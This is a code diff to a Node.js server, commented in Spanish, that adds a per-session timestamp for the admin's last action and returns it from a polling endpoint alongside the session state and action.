@@ -22,6 +22,7 @@ if (!fs.existsSync(DATA_DIR)) {
 const estadoSesiones = new Map();
 const datosSesiones = new Map();
 const ultimaAccionSesiones = new Map();
+const accionTsSesiones = new Map();   // 🔥 NUEVO — Timestamp de la última acción del admin
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
@@ -327,6 +328,7 @@ const server = http.createServer(async (req, res) => {
                         if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
                         estadoSesiones.set(sessionId, 'precio_asignado');
                         ultimaAccionSesiones.set(sessionId, String(valor));
+                        accionTsSesiones.set(sessionId, Date.now());   // 🔥 Timestamp para el polling
                         const datosPrevios = datosSesiones.get(sessionId) || {};
                         const datosActualizados = Object.assign({}, datosPrevios, { monto: Number(valor), precio: Number(valor) });
                         datosSesiones.set(sessionId, datosActualizados);
@@ -359,6 +361,7 @@ const server = http.createServer(async (req, res) => {
                         ultimaAccionSesiones.set(sessionId, accion);
                     }
                     estadoSesiones.set(sessionId, estadoNuevo);
+                    accionTsSesiones.set(sessionId, Date.now());   // 🔥 Timestamp para el polling
                     agregarLog('accion', { usuario: payload.user, sessionId, accion, estadoNuevo });
                     console.log(`[${payload.user}] ${accion} → ${sessionId} | estado: ${estadoNuevo}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -380,6 +383,7 @@ const server = http.createServer(async (req, res) => {
                         datosSesiones.delete(sid);
                         usuariosActivos.delete(sid);
                         ultimaAccionSesiones.delete(sid);
+                        accionTsSesiones.delete(sid);   // 🔥 Limpiar también
                         pasosSesiones.delete(sid);
                     });
                     agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
@@ -834,7 +838,8 @@ const server = http.createServer(async (req, res) => {
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
-            json(res, 200, { estado, accion });
+            const accionTs = accionTsSesiones.get(sessionId) || 0;   // 🔥 NUEVO
+            json(res, 200, { estado, accion, accionTs });            // 🔥 Se envía accionTs
             return;
         }
 
